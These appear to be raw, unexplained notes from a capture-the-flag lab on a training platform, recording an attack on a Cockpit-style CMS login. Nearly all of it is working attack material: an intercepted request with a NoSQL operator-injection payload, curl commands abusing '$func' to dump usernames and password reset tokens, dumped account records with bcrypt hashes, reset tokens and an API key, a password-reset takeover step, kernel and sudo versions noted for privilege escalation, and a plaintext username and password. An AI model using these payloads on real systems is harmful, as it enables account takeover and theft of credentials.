export IP=10.10.196.217
22:ssh --> 
80:http

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc

POST /auth/check HTTP/1.1
Host: 10.10.196.217
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/json; charset=UTF-8
Content-Length: 160
Origin: http://10.10.196.217
Connection: close
Referer: http://10.10.196.217/auth/login?to=/home/auth
Cookie: 8071dec2be26139e39a170762581c00f=p2q1ni407noluivo17crveoms6

{"auth":{"$eq":"admin"},{	"password":[0]
},
"csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"}

user:sd	
success	false
error	"User not found"


 curl -d "@data.json" -X POST http://10.10.196.217/auth/check -H "Content-Type: application/json"

 root@ip-10-10-34-132:~# curl -d "@data.json" -X POST http://10.10.196.217/auth/check -H "Content-Type: application/json"
string(5) "admin"
string(12) "darkStar7471"
string(5) "skidy"
string(8) "ekoparty"
{"success":false,"error":"User not found"}root@ip-10-10-34-132:

string(48) "rp-f88eacee12151a2510bfc8ea249aa40761090bfd2d8e3" admin

 {"user":"admin","name":"Admin","email":"admin@yourdomain.de","active":true,"group":"admin","password":"$2y$10$dChrF2KNbWuib\/5lW1ePiegKYSxHeqWwrVC.FN5kyqhIsIdbtnOjq","i18n":"en","_created":1621655201,"_modified":1621655201,"_id":"60a87ea165343539ee000300","_reset_token":"rp-f88eacee12151a2510bfc8ea249aa40761090bfd2d8e3","md5email":"a11eea8bf873a483db461bb169beccec"};

string(48) "rp-a7e41ab5fa056100da05b88d9646eabb61090ccdc5a03" skidy
{"user":"skidy","email":"skidy@tryhackme.fakemail","active":true,"group":"admin","i18n":"en","api_key":"account-21ca3cfc400e3e565cfcb0e3f6b96d","password":"$2y$10$uiZPeUQNErlnYxbI5PsnLurWgvhOCW2LbPovpL05XTWY.jCUave6S","name":"Skidy","_modified":1621719311,"_created":1621719311,"_id":"60a9790f393037a2e400006a","_reset_token":"rp-a7e41ab5fa056100da05b88d9646eabb61090ccdc5a03","md5email":"5dfac21f8549f298b8ee60e4b90c0e66"}


curl -d '{"token":{ "$func":"var_dump"}}' -X POST http://10.10.196.217/auth/newpassword -H "Content-Type: application/json"

 curl -d "@newpass.json" -X POST http://10.10.196.217/auth/resetpassword -H "Content-Type: application/json"
 sudo version : 1.8.16
 Linux: 4.4.0

 localhost:27017:?
 stux:p4ssw0rdhack3d!123
 